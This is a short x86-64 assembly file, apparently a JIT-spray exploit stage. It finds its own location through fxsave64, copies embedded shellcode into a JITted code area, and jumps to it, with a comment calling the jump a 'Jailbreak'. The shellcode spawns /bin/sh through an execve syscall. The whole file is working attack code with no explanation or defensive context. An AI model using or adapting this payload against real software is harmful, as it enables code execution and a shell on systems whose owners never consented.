BITS 64

L_START:
    fldz
    sub rsp, 2048
    and rsp, 0xfffffffffffffff0
    fxsave64 [rsp]
    mov rdi, [rsp+8]
    jmp L_GETSC
L_GETSC_RET:
    pop rsi                      ; addr of shellcode
    mov ecx, L_SCTAIL-L_SCHEAD   ; sizeof shellcode
    times 1 nop
    rep movsb                    ; copy shellcode to JITted code area
    jmp L_START                  ; Jailbreak

L_GETSC:
    call L_GETSC_RET
L_SCHEAD:
    xor	rax, rax
    cqo
    mov	qword rbx, '//bin/sh'
    shr	rbx, 0x8
    push	rbx
    mov	rdi, rsp
    push	rax
    push	rdi
    mov	rsi, rsp
    mov	al, 0x3b
    syscall
L_SCTAIL:
